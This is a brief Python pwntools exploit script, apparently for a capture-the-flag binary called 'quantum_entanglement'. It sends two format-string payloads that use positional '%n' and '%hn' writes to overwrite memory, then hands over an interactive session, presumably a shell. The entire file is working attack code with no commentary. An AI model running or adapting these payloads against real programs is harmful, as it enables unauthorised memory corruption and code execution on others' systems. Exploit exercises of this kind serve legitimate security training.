from pwn import * 

p=process("./quantum_entanglement")

payload1 = '%*19$d%65$hn'
payload2 = '%*18$d%118$n'
#gdb.attach(p)

p.recv()
p.sendline(payload1)
p.recv()
p.sendline(payload2)
p.interactive()

